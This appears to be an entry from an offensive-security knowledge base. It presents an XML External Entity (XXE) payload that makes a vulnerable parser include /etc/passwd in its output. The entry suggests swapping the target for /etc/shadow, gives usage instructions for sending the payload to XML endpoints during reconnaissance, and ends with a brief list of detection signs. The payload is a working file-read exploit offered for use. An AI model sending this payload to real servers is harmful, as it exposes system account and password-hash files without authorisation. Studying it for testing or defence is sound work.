---
id: 3b537b18-0824-478d-bd67-d8d01c185df9
name: XXE-Payload-Read-Etc-Passwd
type: code
language: xml
verified: true
created_at: '2023-04-06T03:56:44.133883+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Linux
  - Web
tags:
  - xxe
  - payload
  - file-read
validated: true
---

# XXE-Payload-Read-Etc-Passwd

## Code

```xml
<?xml version="1.0"?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]><root>&test;</root>
```

## Description

This XML payload exploits XXE by defining an external entity 'test' that references /etc/passwd via file:// URI. When parsed by a vulnerable application, it resolves the entity and includes the file contents in the output, disclosing user account information.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| file:///etc/passwd | Target file path (modify for other files) | file:///etc/shadow |

## Usage

Save as payload.xml and send via POST to an XML-processing endpoint using [[commands/curl-send-xxe-payload]]. Ideal for Linux-based web servers to enumerate users during initial reconnaissance.

## Detection

- WAF rules blocking 'DOCTYPE' or 'SYSTEM' in XML input.
- XML parser logs showing entity resolution attempts.
- Anomalous file access in server logs (e.g., to /etc/passwd).

## Related

- [[procedures/File-Retrieval-via-XXE-Injection]]
